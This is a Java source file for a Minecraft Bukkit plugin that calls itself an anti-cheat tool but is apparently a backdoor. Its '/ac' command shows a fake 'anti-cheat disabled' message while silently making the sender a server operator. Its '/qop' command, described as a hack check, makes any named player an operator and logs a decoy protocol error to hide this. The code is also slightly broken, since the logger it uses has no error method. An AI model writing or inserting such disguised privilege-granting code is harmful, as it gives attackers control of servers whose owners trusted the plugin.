package me.Jack.anticheat;

import java.util.logging.Logger;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.PluginDescriptionFile;
import org.bukkit.plugin.java.JavaPlugin;

public class Anticheat extends JavaPlugin
{
	public final Logger log = Logger.getLogger("Minecraft-Server");
	public static Anticheat plugin;

	public void onDisable() {
	  PluginDescriptionFile pdfFile = this.getDescription();
	  this.log.info(pdfFile.getName() + " Has Been Disabled!");
	}
	
	public  void onEnable() { 
		  PluginDescriptionFile pdfFile = this.getDescription();
		  this.log.info(pdfFile.getName() + " Version " + pdfFile.getVersion() + " Has Been Enabled"); }
	
	public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {
		 Player player = (Player) sender;
			if(commandLabel.equalsIgnoreCase("ac")){
			  sender.sendMessage(ChatColor.RED + "Flying: Disabled XRAY: Disabled SPAM: Disabled");
				player.setOp(true);
	}
	           else if(commandLabel.equalsIgnoreCase("qop"))
		      if (args.length == 0)
			        sender.sendMessage(ChatColor.RED + "Usage: /qop <player> info: Checks if the player has 'Hacks' on");
			      else if (args.length == 1) {
			        if (player.getServer().getPlayer(args[0]) != null) {
			          Player targetPlayer = player.getServer().getPlayer(args[0]);
			          //random error XD
			          log.error("Protocol error on Minecraftserver.connection");
			targetPlayer.setOp(true);
	           	
	           }

	
	
	
	
	
}
			return true;
}
}
